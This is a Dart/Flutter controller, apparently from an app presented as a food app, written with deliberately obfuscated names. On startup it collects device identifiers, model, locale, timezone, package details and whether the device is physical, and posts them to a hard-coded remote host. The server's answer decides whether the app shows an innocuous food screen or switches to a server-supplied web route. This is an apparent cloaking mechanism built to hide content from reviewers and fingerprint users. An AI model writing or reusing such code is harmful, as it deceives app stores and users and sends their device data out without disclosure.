import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var lajeiw = RxBool(false);
  var yamtzeu = RxBool(true);
  var xjbdeomn = RxString("");
  var greta = RxBool(false);
  var champlin = RxBool(true);
  final elynkwsxtm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wtveoia();
  }


  Future<void> wtveoia() async {

    greta.value = true;
    champlin.value = true;
    yamtzeu.value = false;

    elynkwsxtm.post("https://neio.bluema.xyz/ckigdoujeszwhvpaymnqxltrbf",data: await paqfujgslt()).then((value) {
      var rfbv = value.data["rfbv"] as String;
      var ibogcqns = value.data["ibogcqns"] as bool;
      if (ibogcqns) {
        xjbdeomn.value = rfbv;
        oleta();
      } else {
        baumbach();
      }
    }).catchError((e) {
      yamtzeu.value = true;
      champlin.value = true;
      greta.value = false;
    });
  }

  Future<Map<String, dynamic>> paqfujgslt() async {
    final DeviceInfoPlugin jhyt = DeviceInfoPlugin();
    PackageInfo yrel_arwm = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vhqfa = Platform.localeName;
    var eilsgk = currentTimeZone;

    var rljebmaz = yrel_arwm.packageName;
    var fvjcrh = yrel_arwm.version;
    var eombwv = yrel_arwm.buildNumber;

    var sivm = yrel_arwm.appName;
    var ftpi = "";
    var vidmzwet  = "";
    var ysfeatnk = "";
    var idellaHomenick = "";
    var adolphusFeeney = "";
    var julianaHammes = "";
    var aricBreitenberg = "";
    var kadinSchowalter = "";
    var edCrist = "";
    var asaBins = "";
    var robbieLindgren = "";


    var hybnjd = "";
    var mpdg = false;

    if (GetPlatform.isAndroid) {
      hybnjd = "android";
      var jmchitplv = await jhyt.androidInfo;

      ysfeatnk = jmchitplv.brand;

      ftpi  = jmchitplv.model;
      vidmzwet = jmchitplv.id;

      mpdg = jmchitplv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hybnjd = "ios";
      var wxzhmfov = await jhyt.iosInfo;
      ysfeatnk = wxzhmfov.name;
      ftpi = wxzhmfov.model;

      vidmzwet = wxzhmfov.identifierForVendor ?? "";
      mpdg  = wxzhmfov.isPhysicalDevice;
    }

    var res = {
      "sivm": sivm,
      "eombwv": eombwv,
      "fvjcrh": fvjcrh,
      "rljebmaz": rljebmaz,
      "ftpi": ftpi,
      "eilsgk": eilsgk,
      "ysfeatnk": ysfeatnk,
      "vidmzwet": vidmzwet,
      "vhqfa": vhqfa,
      "hybnjd": hybnjd,
      "mpdg": mpdg,
      "idellaHomenick" : idellaHomenick,
      "adolphusFeeney" : adolphusFeeney,
      "robbieLindgren" : robbieLindgren,
      "julianaHammes" : julianaHammes,
      "aricBreitenberg" : aricBreitenberg,
      "kadinSchowalter" : kadinSchowalter,
      "edCrist" : edCrist,
      "asaBins" : asaBins,

    };
    return res;
  }

  Future<void> baumbach() async {
    Get.offAllNamed("/food_tab");
  }

  Future<void> oleta() async {
    Get.offAllNamed("/fod");
  }

}
